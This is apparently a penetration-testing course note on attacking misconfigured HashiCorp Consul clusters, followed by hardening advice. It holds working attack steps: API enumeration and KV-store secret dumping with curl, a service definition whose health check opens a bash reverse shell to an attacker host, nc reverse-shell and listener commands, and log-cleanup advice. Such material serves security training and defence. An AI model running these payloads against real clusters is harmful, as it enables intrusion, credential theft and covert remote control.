---
tags: [consul, hashicorp, service-mesh, rce, network, misconfiguration]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.23 Consul"
---

# Consul — Service Mesh Misconfig

## 1. Introduction to Consul

HashiCorp Consul is a highly distributed, highly available service mesh and key-value store. It provides a full-featured control plane with service discovery, configuration, and segmentation functionality. Consul can be run in any environment—from on-premise data centers to complex, multi-cloud containerized environments like Kubernetes.

Because Consul acts as the central nervous system for microservices routing, discovery, and configuration, a compromise of a Consul cluster is a critical security incident. Attackers who gain access to Consul can manipulate service discovery to perform Man-in-the-Middle (MitM) attacks, extract sensitive configuration data from the KV store, or achieve Remote Code Execution (RCE) on cluster nodes via Consul's script checks and external execution features.

## 2. Architecture & Concepts

A Consul architecture consists of several key components:

- **Consul Servers:** The brain of the cluster. They store the state, handle leader election (via Raft), and replicate data. Usually deployed in clusters of 3 or 5.
- **Consul Clients:** Lightweight agents running on every node (VM or container) that needs to participate in the mesh. They forward queries to the servers and run health checks.
- **Service Discovery:** Applications register themselves with the local Consul client, which propagates this to the servers. Other apps query Consul via DNS or HTTP to find services.
- **Key-Value (KV) Store:** A hierarchical database used for dynamic application configuration.
- **Access Control Lists (ACLs):** Consul's native authorization mechanism. If ACLs are not configured or are poorly configured, the API operates in an unauthenticated, fully permissive mode.

## 3. ASCII Diagram: Consul RCE Attack Flow

```text
      [ Attacker ]
           |
           | (1) Discovers Unauthenticated Consul API (Port 8500)
           v
  +--------------------------------+
  |    Consul Agent (Client Node)  |
  |    Port: 8500 (HTTP API)       |
  |                                |
  |  (2) Register Malicious Service|
  |      with a Script Health Check|
  +--------------------------------+
           |
           | (3) Consul Agent executes the health check script
           v
  +--------------------------------+
  |    Underlying Operating System |
  |                                |
  |  $ /bin/bash -c "nc -e /bin/sh | <-- (4) RCE Triggered!
  |    attacker_ip 4444"           |
  +--------------------------------+
           |
           | (5) Reverse Shell
           v
      [ Attacker ]
```

## 4. Reconnaissance & Enumeration

Consul operates on several ports, but the HTTP API is the most common target for attackers.

### Default Ports
- **8500/TCP:** HTTP API & Web UI (Most critical for attackers).
- **8501/TCP:** HTTPS API.
- **8502/TCP:** gRPC API.
- **8300/TCP:** Server RPC (Server-to-server traffic).
- **8301/TCP/UDP:** Serf LAN (Gossip protocol for local cluster).
- **8302/TCP/UDP:** Serf WAN (Gossip protocol across datacenters).
- **8600/TCP/UDP:** DNS interface for service discovery.

### Enumerating the API

The HTTP API on port 8500 provides deep insights into the cluster.

```bash
# Get Consul agent information (returns JSON with version, node name, IP)
curl -s http://<target-ip>:8500/v1/agent/self | jq

# List all nodes in the datacenter
curl -s http://<target-ip>:8500/v1/catalog/nodes | jq

# List all registered services
curl -s http://<target-ip>:8500/v1/catalog/services | jq

# Check ACL configuration (If "Enabled": true, you need tokens. If false, it's open season)
curl -s http://<target-ip>:8500/v1/acl/info | jq
```

## 5. Exploitation: Unauthenticated API Access & KV Store

If ACLs are disabled (which is common in default deployments or legacy setups), any user who can reach port 8500 can read and write cluster data.

### Reading the Key-Value Store

Applications frequently use Consul's KV store for configuration, which often inadvertently includes database passwords, API keys, and TLS certificates.

```bash
# List all keys
curl -s http://<target-ip>:8500/v1/kv/?keys | jq

# Read a specific key (The value is Base64 encoded)
curl -s http://<target-ip>:8500/v1/kv/config/prod/db_password | jq
```
*Note: You must decode the `Value` field from Base64.*

### Service Mesh Manipulation (MitM)

An attacker can unregister legitimate services and register their own rogue endpoints. For example, if a web app queries Consul for the IP of the `payment-db` service, an attacker can modify the registry so Consul returns the attacker's IP instead. The web app will then send database credentials and traffic directly to the attacker.

## 6. Exploitation: RCE via Consul Scripts

The most devastating attack against Consul is leveraging its health check mechanism to achieve Remote Code Execution.

By default, Consul allows services to define "Health Checks". A health check can be an HTTP request, a TCP connection, or a **Script Check** (an arbitrary command executed by the Consul agent on the underlying OS).

*Note: In newer versions (Consul 1.1.0+), script checks are disabled by default (`-enable-script-checks=false`). However, in many deployments, administrators re-enable them, or you may be attacking an older version.*

### Step 1: Create a Malicious Service Definition

Create a JSON file (`payload.json`) that registers a dummy service and includes a script health check containing a reverse shell payload.

```json
{
  "ID": "malicious-service",
  "Name": "malicious-service",
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"],
    "Interval": "10s",
    "Timeout": "5s"
  }
}
```

### Step 2: Register the Service via the API

Send a PUT request to the local agent to register the service. The agent will immediately begin executing the health check according to the `Interval`.

```bash
curl -X PUT -d @payload.json http://<target-ip>:8500/v1/agent/service/register
```

### Step 3: Catch the Shell

Start a Netcat listener on your machine. Every 10 seconds, the Consul agent will execute the script, throwing a reverse shell to your listener.

```bash
nc -lvnp 4444
```

### Step 4: Cleanup

Once you have established persistence, deregister the malicious service to avoid leaving noisy, failing health checks in the Consul logs.

```bash
curl -X PUT http://<target-ip>:8500/v1/agent/service/deregister/malicious-service
```

## 7. Exploiting Consul Access Control Lists (ACLs)

If ACLs are enabled, you will need a token. Sometimes, low-privileged tokens are hardcoded in application source code, or left in bash history.

Tokens are passed via the `X-Consul-Token` header.

```bash
curl -H "X-Consul-Token: <stolen-token>" http://<target-ip>:8500/v1/agent/self
```

If you obtain a token, enumerate its permissions. A token might have permission to write to the KV store but not register services. In rare cases, a leaked "Management" token gives you full administrative access over the cluster.

## 8. Defense & Hardening

Securing Consul requires strict enforcement of authentication and network isolation.

### 1. Enable and Enforce ACLs
The foundation of Consul security. Enable ACLs and enforce them strictly. Change the default policy from `allow` to `deny`.
```json
{
  "acl": {
    "enabled": true,
    "default_policy": "deny",
    "enable_token_persistence": true
  }
}
```

### 2. Disable Script Checks
Ensure that arbitrary script execution is disabled on all agents unless absolutely necessary.
```json
{
  "enable_script_checks": false
}
```

### 3. Implement mTLS
Secure communication between agents and servers using mutual TLS. This prevents unauthorized nodes from joining the cluster or sniffing gossip traffic.

### 4. Network Segmentation
Port 8500 should never be exposed to the internet. Access to the UI and API should be restricted to administrative IPs, VPNs, or bastion hosts using strong network firewalls.

### 5. Secure Gossip Encryption
Consul uses Serf for gossip. This traffic should be encrypted with a shared symmetric key to prevent eavesdropping on cluster metadata.
```json
{
  "encrypt": "<base64-encoded-key>"
}
```

## 9. Chaining Opportunities

- **SSRF to Consul RCE:** If a web application has an SSRF vulnerability, you can use it to hit `http://localhost:8500` to register a malicious service, turning SSRF into RCE. Link to `[[05 - Server-Side Request Forgery (SSRF)]]`.
- **KV Store to Privilege Escalation:** Extracting AWS keys or K8s tokens from the Consul KV store to escalate privileges in the broader cloud environment. Link to `[[38 - AWS IAM Privilege Escalation]]` (hypothetical topic).
- **DNS Hijacking:** Leveraging open Consul DNS (Port 8600) to reroute internal traffic.

## 10. Related Notes

- `[[22 - etcd — Exposed Key-Value Store]]`
- `[[24 - Zookeeper — Unauthenticated Access]]`
- `[[12 - Command Injection]]` (Conceptually similar to Script Check RCE)
- `[[30 - Infrastructure as Code (IaC) Security]]`
